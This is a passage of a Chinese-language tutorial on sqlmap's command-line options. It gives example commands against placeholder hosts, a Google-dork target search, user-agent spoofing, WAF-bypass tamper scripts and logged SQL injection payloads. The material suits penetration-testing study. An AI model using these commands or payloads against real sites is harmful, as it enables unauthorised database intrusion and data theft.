强制不使用代理</span></span><br><span class="line"><span class="ruby">--delay             请求延迟间隔，单位秒，默认无延迟</span></span><br><span class="line"><span class="ruby">--retries           链接失败重试次数<span class="number">3</span></span></span><br><span class="line"><span class="ruby">--timeout           链接超时时间<span class="number">30</span></span></span><br><span class="line"><span class="ruby">--randomize=<span class="string">&quot;param&quot;</span>     使用和源参数类型长度一致的参数</span></span><br><span class="line"><span class="ruby">sqlmap -l l.log --scope=<span class="string">&quot;(www)?\.target\.(com|net|org)&quot;</span>     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名</span></span><br><span class="line"><span class="ruby">sqlmap -l <span class="number">2</span>.log --scope=<span class="string">&quot;(19)?\.168\.20\.(1|11|111)&quot;</span>        同上，筛选<span class="number">19</span>*.<span class="number">168.20</span>.<span class="number">1</span>/<span class="number">11</span>/<span class="number">111</span>这几个网段的IP</span></span><br><span class="line"><span class="ruby">--safe-url=<span class="string">&quot;url&quot;</span>        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生</span></span><br><span class="line"><span class="ruby">--safe-freq <span class="number">10</span>          尝试的与正确的URL的交换频率</span></span><br><span class="line"><span class="ruby">--skip-urlencode        有的URL在get方式提交时没编码，就要用这个</span></span><br><span class="line"><span class="ruby">--eval=<span class="string">&quot;&quot;</span>php代码      这个后面可以跟PHP代码，能够执行</span></span><br><span class="line"><span class="ruby">--keep-alive            保持连接会降低资源使用，但是不能与代理兼容</span></span><br><span class="line"><span class="ruby">--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容</span></span><br><span class="line"><span class="ruby">--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容</span></span><br><span class="line"><span class="ruby">--threads           最大并发数，默认<span class="number">1</span>，最大不要超过<span class="number">10</span>，盲注时一次返回一个字符【<span class="number">7</span>次请求】</span></span><br><span class="line"><span class="ruby">-o              使用除了--threads的全部的优化参数</span></span><br><span class="line"><span class="ruby">-p              指定参数，使level失效</span></span><br><span class="line"><span class="ruby">-skip               排除不扫描的参数</span></span><br><span class="line"><span class="ruby">                对于伪静态网页，就在参数后面加*</span></span><br><span class="line"><span class="ruby">--dbms              接数据库管理系统，如MySQL</span></span><br><span class="line"><span class="ruby">--os                接系统，如Linux</span></span><br><span class="line"><span class="ruby">--invalid-bignum        使用大数作为假的值</span></span><br><span class="line"><span class="ruby">--invalid-logical       使用逻辑数作为假的值</span></span><br><span class="line"><span class="ruby">--no-cat            对于接收到的null不自动转换成空格</span></span><br><span class="line"><span class="ruby">--no-escape         不使用逃逸，就是不把<span class="string">&#x27;转换成asii码形式</span></span></span><br><span class="line"><span class="ruby">--prefix            在参数前指定前缀</span></span><br><span class="line"><span class="ruby">--suffix            在参数后指定后缀</span></span><br><span class="line"><span class="ruby">--level             设置检查的等级，默认为<span class="number">1</span>，共<span class="number">5</span>个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息</span></span><br><span class="line"><span class="ruby">--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容</span></span><br><span class="line"><span class="ruby">--string            当页面含有这个字符串时为真</span></span><br><span class="line"><span class="ruby">--<span class="keyword">not</span>-string            当页面不含这个字符串时为真</span></span><br><span class="line"><span class="ruby">--regexp            用正则表达式判断</span></span><br><span class="line"><span class="ruby">--code              当状态代码为*时为真</span></span><br><span class="line"><span class="ruby">--text-only         页面含有*时为真</span></span><br><span class="line"><span class="ruby">--titles            页面标题为*时为真</span></span><br><span class="line"><span class="ruby">--techniques </span></span><br><span class="line"><span class="ruby">B E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询</span></span><br><span class="line"><span class="ruby">--time-sec          </span></span><br><span class="line"><span class="ruby">--union-cols            联合查询第几列到第几列</span></span><br><span class="line"><span class="ruby">--union-char            用select null,<span class="number">1</span><span class="symbol">:</span><span class="number">2</span>  这种，可能会出错，就讲这个null换成其他数字占位</span></span><br><span class="line"><span class="ruby">--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方</span></span><br><span class="line"><span class="ruby">-fingerprint            指纹信息</span></span><br><span class="line"><span class="ruby">--banner            版本信息</span></span><br><span class="line"><span class="ruby">--batch             按照软件默认设置，自动回答</span></span><br><span class="line"><span class="ruby">--count             计数</span></span><br><span class="line"><span class="ruby">-s              将这个会话保存下次继续</span></span><br><span class="line"><span class="ruby">-t              将这些数据保存</span></span><br><span class="line"><span class="ruby">--charset           强制设置数据库编码</span></span><br><span class="line"><span class="ruby">--crawl             设置蜘蛛爬行的深度</span></span><br><span class="line"><span class="ruby">--csv-del           设置下载的数据的分隔方式，默认是,</span></span><br><span class="line"><span class="ruby">--dbms-cred         设置数据库用户</span></span><br><span class="line"><span class="ruby">--flush-session         清空以前的会话数据</span></span><br><span class="line"><span class="ruby">--fresh-queries         不清空会话，重新查询</span></span><br><span class="line"><span class="ruby">--hex               一<span class="number">16</span>进制编码的方式传输数据</span></span><br><span class="line"><span class="ruby">--output-dir            会话输出文件夹</span></span><br><span class="line"><span class="ruby">--parse-errors          显示MySQL错误信息</span></span><br><span class="line"><span class="ruby">--save              保存当前配置为文件</span></span><br><span class="line"><span class="ruby">-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.</span></span><br><span class="line"><span class="ruby">--answers           这个可以对一些特定的问题作出回答，在自动化注入中用</span></span><br><span class="line"><span class="ruby">--check-waf         检查是否含有waf等</span></span><br><span class="line"><span class="ruby">--identify-waf          彻底的检查waf等的信息</span></span><br><span class="line"><span class="ruby">--smart     当有大量目标时，这个就只检查基于错误的注入点</span></span><br><span class="line"><span class="ruby">--mobile    模拟智能手机去扫描</span></span><br><span class="line"><span class="ruby">--wizard    向导模式</span></span><br><span class="line"><span class="ruby">--purge-out 清除输出内容</span></span><br></pre></td></tr></table></figure>
<p>使用<code>-l</code>参数时，这样设置<code>burpsuite</code>：</p>
<p><img src="https://img.npfs06.top/20210326210404.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h1><p>当给<code>sqlmap</code>这么一个<code>url</code>的时候，它会：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 判断可注入的参数</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> 判断可以用那种SQL注入技术来注入</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> 识别出哪种数据库</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> 根据用户选择，读取哪些数据</span><br></pre></td></tr></table></figure>
<p><code>sqlmap</code>支持五种不同的注入模式：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 基于布尔的盲注，即可以根据返回页面判断条件（真\|假）的注入。</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> 联合查询注入，可以使用union的情况下的注入。</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> 堆查询注入，可以同时执行多条语句的执行时的注入。（使用;分隔开多条语句，最为灵活，可以自己构造select（含）外的其他语句）</span><br></pre></td></tr></table></figure>
<p><code>sqlmap</code>支持的数据库管理系统有：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">MySQL, Oracle, PostgreSQL, Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>, Microsoft <span class="keyword">Access</span>, IBM DB2,</span><br><span class="line">SQLite, Firebird, Sybase和SAP MaxDB</span><br></pre></td></tr></table></figure>
<p>可以提供一个简单的<code>URL，Burp</code>或<code>WebScarab</code>请求日志文件，文本文档中的完整<code>http</code>请求或者<code>Google</code>的搜索，匹配出结果页面，</p>
<p>也可以自己定义一个正则来判断那个地址去测试。</p>
<p>测试<code>GET</code>参数，<code>POST</code>参数，<code>HTTP Cookie</code>参数，<code>HTTP User-Agent</code>头和<code>HTTP Referer</code>头来确认是否有<code>SQL</code>注入，</p>
<p>它也可以指定用逗号分隔的列表的具体参数来测试。可以设定<code>HTTP(S)</code>请求的并发数，来提高盲注时的效率。</p>
<h1 id="用来连接数据库"><a href="#用来连接数据库" class="headerlink" title="用来连接数据库"></a>用来连接数据库</h1><p>这是一个比较实用的功能，用来连接数据库格式为</p>
<p><img src="https://img.npfs06.top/20210326210431.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="设置显示信息的详细度："><a href="#设置显示信息的详细度：" class="headerlink" title="设置显示信息的详细度："></a>设置显示信息的详细度：</h1><p>使用<code>-v</code>参数，共有<code>七</code>个等级：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">0.</span> 只显示python错误以及严重的信息。</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 同时显示基本信息和警告信息。（默认）</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> 同时显示debug信息。</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> 同时显示注入的payload。</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> 同时显示HTTP请求。</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> 同时显示HTTP响应头。</span><br><span class="line"></span><br><span class="line"><span class="bullet">6.</span> 同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>
<p>可以通过学习<code>sqlmap</code>的<code>payload</code>来学习<code>sql</code>注入，这时需要使用3级。</p>
<h1 id="获取目标方式"><a href="#获取目标方式" class="headerlink" title="获取目标方式"></a>获取目标方式</h1><p><strong>目标URL</strong></p>
<p>参数：<code>-u</code>或者<code>–url</code></p>
<p>格式：<code>http(s)://targeturl[:port]/[…]</code></p>
<p>例如：<code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users</code></p>
<p>从<code>Burp</code>或者<code>WebScarab</code>代理中获取日志</p>
<p>参数：<code>-l</code></p>
<p>可以直接吧<code>Burp proxy</code>或者<code>WebScarab proxy</code>中的日志直接倒出来交给<code>sqlmap</code>来一个一个检测是否有注入。</p>
<p><strong>从文本中获取多个目标扫描</strong></p>
<p>参数：<code>-m</code></p>
<p>文件中保存<code>url</code>格式如下，<code>sqlmap</code>会一个一个检测</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>.target<span class="number">1</span>.com/vuln<span class="number">1</span>.php?q=foobar</span><br><span class="line"></span><br><span class="line"><span class="attribute">www</span>.target<span class="number">2</span>.com/vuln<span class="number">2</span>.asp?id=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">www</span>.target<span class="number">3</span>.com/vuln<span class="number">3</span>/id/<span class="number">1</span>*</span><br></pre></td></tr></table></figure>
<p><strong>从文件中加载HTTP请求</strong></p>
<p>参数：<code>-r</code></p>
<p><code>sqlmap</code>可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数（比如<code>cookie，POST</code>数据，等等）。</p>
<p>比如文本文件内如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/vuln.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.target.com</span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
<p>当请求是HTTPS的时候你需要配合这个<code>–force-ssl</code>参数来使用，或者你可以在Host头后面加上:<code>443</code></p>
<p><strong>处理Google的搜索结果</strong></p>
<p>参数：<code>-g</code></p>
<p><code>sqlmap</code>可以测试注入<code>Google</code>的搜索结果中的<code>GET</code>参数（只获取前<code>100</code>个结果）。</p>
<p>例子：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -g <span class="string">&quot;inurl:<span class="subst">\&quot;</span>.php?id=1<span class="subst">\&quot;</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。</p>
<h1 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h1><p><strong>http数据</strong></p>
<p>参数：<code>–data</code></p>
<p>此参数是把数据以<code>POST</code>方式提交，<code>sqlmap</code>会像检测GET参数一样检测<code>POST</code>的参数。</p>
<p>例子：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.target.com/vuln.php&quot;</span> <span class="params">--data=</span><span class="string">&quot;id=1&quot;</span> -f <span class="params">--banner</span> <span class="params">--dbs</span> <span class="params">--users</span></span><br></pre></td></tr></table></figure>
<p><strong>参数拆分字符</strong></p>
<p>参数：<code>–param-del</code></p>
<p>当<code>GET</code>或<code>POST</code>的数据需要用其他字符分割测试参数的时候需要用到此参数（默认是&amp;）。</p>
<p>例子：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.target.com/vuln.php&quot;</span> <span class="params">--data=</span><span class="string">&quot;query=foobar;id=1&quot;</span></span><br><span class="line"><span class="params">--param-del=</span><span class="string">&quot;;&quot;</span> -f <span class="params">--banner</span> <span class="params">--dbs</span> <span class="params">--users</span></span><br></pre></td></tr></table></figure>
<p><strong>HTTP cookie头</strong></p>
<p>参数：<code>–cookie,–load-cookies,–drop-set-cookie</code></p>
<p>这个参数在以下两个方面很有用：</p>
<ol>
<li>web应用需要登陆的时候。</li>
<li>你想要在这些头参数中测试SQL注入时。</li>
</ol>
<p>可以通过抓包把<code>cookie</code>获取到，复制出来，然后加到<code>–cookie</code>参数里。</p>
<p>在<code>HTTP</code>请求中，遇到<code>Set-Cookie</code>的话，<code>sqlmap</code>会自动获取并且在以后的请求中加入，并且会尝试<code>SQL</code>注入。</p>
<p>如果你不想接受<code>Set-Cookie</code>可以使用<code>–drop-set-cookie</code>参数来拒接。</p>
<p>当你使用<code>–cookie</code>参数时，当返回一个<code>Set-Cookie</code>头的时候，<code>sqlmap</code>会询问你用哪个<code>cookie</code>来继续接下来的请求。</p>
<p>当<code>–level</code>的参数设定为2或者2以上的时候，<code>sqlmap</code>会尝试注入<code>Cookie</code>参数。</p>
<p><strong>HTTP User-Agent头</strong></p>
<p>参数：<code>–user-agent,–random-agent</code></p>
<p>默认情况下<code>sqlmap</code>的<code>HTTP</code>请求头中<code>User-Agen</code>t值是：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span>/<span class="number">1</span>.<span class="number">0</span>-dev-xxxxxxx (http://sqlmap.org)</span><br></pre></td></tr></table></figure>
<p>（这可能直接会被过滤掉或是触发警报，可以使用真实浏览器的<code>useragent</code>，百度一下就有了）</p>
<p>可以使用<code>–user-anget</code>参数来修改，同时也可以使用<code>–random-agnet</code>参数来随机的从<code>./txt/user-agents.txt</code>中获取。</p>
<p>当<code>–level</code>参数设定为3或者3以上的时候，会尝试对<code>User-Angent</code>进行注入。</p>
<p><strong>HTTP Referer头</strong></p>
<p>参数：<code>–referer</code></p>
<p><code>sqlmap</code>可以在请求中伪造HTTP中的<code>referer</code>，当<code>–level</code>参数设定为3或者3以上的时候会尝试对referer注入。</p>
<p><strong>额外的HTTP头</strong></p>
<p>参数：<code>–headers</code></p>
<p>可以通过<code>–headers</code>参数来增加额外的http头</p>
<p><strong>HTTP认证保护</strong></p>
<p>参数：<code>–auth-type,–auth-cred</code></p>
<p>这些参数可以用来登陆HTTP的认证保护支持三种方式：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> Basic</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> Digest</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> NTLM</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span></span><br><span class="line">--auth-<span class="built_in">type</span> Basic --auth-cred <span class="string">&quot;testuser:testpass&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>HTTP协议的证书认证</strong></p>
<p>参数：<code>–auth-cert</code></p>
<p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:<code>key_file，cert_file</code>。</p>
<p><code>key_file</code>是格式为PEM文件，包含着你的私钥，<code>cert_file</code>是格式为<code>PEM</code>的连接文件。</p>
<p><strong>HTTP(S)代理</strong></p>
<p>参数：<code>–proxy,–proxy-cred</code>和<code>–ignore-proxy</code></p>
<p>使用<code>–proxy</code>代理是格式为：<code>http://url:port。</code></p>
<p>当<code>HTTP(S)</code>代理需要认证是可以使用<code>–proxy-cred</code>参数：<code>username:password</code>。</p>
<p><code>–ignore-proxy</code>拒绝使用本地局域网的<code>HTTP(S)</code>代理。</p>
<p><strong>HTTP请求延迟</strong></p>
<p>参数：<code>–delay</code></p>
<p>可以设定两个<code>HTTP(S)</code>请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
<p><strong>设定超时时间</strong></p>
<p>参数：<code>–timeout</code></p>
<p>可以设定一个<code>HTTP(S)</code>请求超过多久判定为超时，<code>10.5</code>表示<code>10.5</code>秒，默认是<code>30</code>秒。</p>
<p><strong>设定重试超时</strong></p>
<p>参数：<code>–retries</code></p>
<p>当<code>HTTP(S)</code>超时时，可以设定重新尝试连接次数，默认是3次。</p>
<p><strong>设定随机改变的参数值</strong></p>
<p>参数：<code>–randomize</code></p>
<p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p>
<p>利用正则过滤目标网址</p>
<p>参数：<code>**–scope**</code></p>
<p>例如：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l burp.log --scope=&quot;(www)?<span class="symbol">\.</span>target<span class="symbol">\.</span>(com<span class="symbol">\|</span>net<span class="symbol">\|</span>org)&quot;</span><br></pre></td></tr></table></figure>
<p><strong>避免过多的错误请求被屏蔽</strong></p>
<p>参数：<code>–safe-url,–safe-freq</code></p>
<p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>
<p><strong>绕过这个策略有两种方式：</strong></p>
<ol>
<li><code>--safe-url</code>：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li>
<li><code>--safe-freq</code>：提供一个安全不错误的连接，一段频率后会访问一次。</li>
</ol>
<p><strong>关掉URL参数值编码</strong></p>
<p>参数：<code>–skip-urlencode</code></p>
<p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过<code>URL</code>编码的值，这时候就需要用<code>–skip-urlencode</code>参数。</p>
<p><strong>每次请求时候执行自定义的python代码</strong></p>
<p>参数：<code>–eval</code></p>
<p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p>
<p>例子：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span></span><br><span class="line"><span class="string">&quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;</span></span><br><span class="line">--<span class="built_in">eval</span>=<span class="string">&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面的请求就是每次请求时根据id参数值，做一次<code>md5</code>后作为<code>hash</code>参数的值。</p>
<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p><strong>测试参数</strong></p>
<p>参数：<code>-p</code></p>
<p>如： <code>-p “id,user-anget”</code></p>
<p><strong>指定要跳过测试的参数</strong></p>
<p>参数：<code>–skip</code></p>
<p>如：<code>–skip=”user-angent.referer”</code></p>
<p>对于伪静态链接，可以在想测试的参数后面加*，它会测试那个指定的参数</p>
<p>例如：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://targeturl/param1/value1\*/param2/value2/&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>指定数据库</strong></p>
<p>参数：<code>–dbms</code></p>
<p>不指定会自动探测，如果知道最好指定</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">MySQL、Oracle、PostgreSQL、Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>、Microsoft</span><br><span class="line"><span class="keyword">Access</span>、SQLite、Firebird、Sybase、SAP MaxDB、DB2</span><br></pre></td></tr></table></figure>
<p><strong>指定服务器系统</strong></p>
<p>参数：<code>–os</code></p>
<p>不指定会自动探测，支持的有：<code>Linux、Windows</code>。</p>
<p><strong>指定无效的大数字</strong></p>
<p>参数：<code>–invalid-bignum</code></p>
<p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系<code>id=13，sqlmap</code>会变成<code>id=-13</code>来报错，你可以指定比如<code>id=9999999</code>来报错。</p>
<p><strong>指定无效的逻辑</strong></p>
<p>参数：<code>–invalid-logical</code></p>
<p>原因同上，可以指定<code>id=13</code>把原来的<code>id=-13</code>的报错改成<code>id=13 AND 18=19</code>。</p>
<p><strong>注入payload</strong></p>
<p>参数：<code>–prefix,–suffix</code></p>
<p>在有些环境中，需要在注入的<code>payload</code>的前面或者后面加一些字符，来保证<code>payload</code>的正常执行。</p>
<p>例如，代码中是这样调用数据库的：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">$query = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=(’<span class="string">&quot; . $_GET[’id’] . &quot;</span>’) <span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
<p>这时你就需要<code>–prefix</code>和<code>–suffix</code>参数了：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -p <span class="built_in">id</span> <span class="comment">--prefix</span></span><br><span class="line"><span class="string">&quot;’)&quot;</span> <span class="comment">--suffix &quot;AND (’abc’=’abc&quot;</span></span><br></pre></td></tr></table></figure>
<p>这样执行的SQL语句变成：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">$query = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=(’<span class="number">1</span>’) &lt;PAYLOAD&gt; <span class="keyword">AND</span> (’abc’=’abc’)</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
<p><strong>修改注入的数据</strong></p>
<p>参数：<code>–tamper</code></p>
<p><code>sqlmap</code>除了使用<code>CHAR()</code>函数来防止出现单引号之外没有对注入的数据修改，你可以使用<code>–tamper</code>参数对数据做修改来绕过WAF等设备。<br>下面是一个<code>tamper</code>脚本的格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Needed imports</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="comment"># Define which is the order of application of tamper scripts against</span></span><br><span class="line"><span class="comment"># the payload</span></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload</span>):</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Description of your tamper script</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">retVal = payload</span><br><span class="line"><span class="comment"># your code to tamper the original payload</span></span><br><span class="line"><span class="comment"># return the tampered payload</span></span><br><span class="line"><span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>可以查看 <code>tamper/</code> 目录下的有哪些可用的脚本</p>
<p>例如：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span><br><span class="line"></span><br><span class="line">[hh:mm:03] [<span class="builtin-name">DEBUG</span>] cleaning up configuration parameters</span><br><span class="line">[hh:mm:03] [<span class="builtin-name">INFO</span>] loading tamper<span class="built_in"> script </span><span class="string">&#x27;between&#x27;</span></span><br><span class="line">[hh:mm:03] [<span class="builtin-name">INFO</span>] loading tamper<span class="built_in"> script </span><span class="string">&#x27;randomcase&#x27;</span></span><br><span class="line">[hh:mm:03] [<span class="builtin-name">INFO</span>] loading tamper<span class="built_in"> script </span><span class="string">&#x27;space2comment&#x27;</span></span><br><span class="line">[<span class="built_in">..</span>.]</span><br><span class="line">[hh:mm:04] [<span class="builtin-name">INFO</span>] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] 1)/**/<span class="keyword">And</span>/**/<span class="attribute">1369</span>=7706/**/And/**/(4092=4092</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1)/**/<span class="keyword">AND</span>/**/<span class="attribute">9267</span>=9267/**/AND/**/(4057=4057</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1/**/<span class="keyword">AnD</span>/**/<span class="attribute">950</span>=7041</span><br><span class="line">[<span class="built_in">..</span>.]</span><br><span class="line">[hh:mm:04] [<span class="builtin-name">INFO</span>] testing <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] 1/**/<span class="keyword">anD</span>/**/(SELeCt/**/9921/**/<span class="keyword">fROm</span>(SELeCt/**/counT(*),CONCAT(cHar(</span><br><span class="line">58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(<span class="attribute">9921</span>=9921)/**/THeN/**/1/**/elsE/**/0/**/</span><br><span class="line">ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)<span class="number">*2</span>))x/**/<span class="keyword">fROm</span>/**/information_schema.tables/**/</span><br><span class="line">group/**/bY/**/x)a)</span><br><span class="line">[hh:mm:04] [<span class="builtin-name">INFO</span>] <span class="builtin-name">GET</span> parameter <span class="string">&#x27;id&#x27;</span> is <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING</span></span><br><span class="line"><span class="string">clause&#x27;</span> injectable</span><br><span class="line">[<span class="built_in">..</span>.]</span><br></pre></td></tr></table></figure>
<h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><p><strong>探测等级</strong></p>
<p>参数：<code>–level</code></p>
<p>共有五个等级，默认为<code>1，sqlmap</code>使用的<code>payload</code>可以在<code>xml/payloads.xml</code>中看到，你也可以根据相应的格式添加自己的<code>payload</code>。</p>
<p>这个参数不仅影响使用哪些<code>payload</code>同时也会影响测试的注入点，<code>GET</code>和<code>POST</code>的数据都会测试，<code>HTTP Cookie</code>在<code>level</code>为2的时候</p>
<p>就会测试，<code>HTTP User-Agent/Referer</code>头在<code>level</code>为3的时候就会测试。</p>
<p>总之在你不确定哪个<code>payload</code>或者参数为注入点的时候，为了保证全面性，建议使用高的<code>level</code>值。</p>
<p><strong>风险等级</strong></p>
<p>参数：<code>–risk</code></p>
<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
<p>测试的语句同样可以在<code>xml/payloads.xml</code>中找到，你也可以自行添加<code>payload</code>。</p>
<p><strong>页面比较</strong></p>
<p>参数：<code>–string,–not-string,–regexp,–code</code></p>
<p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，</p>
<p>比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，</p>
<p>在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），</p>
<p>同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。</p>
<p>用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。</p>
<p>参数：<code>–text-only,–titles</code></p>
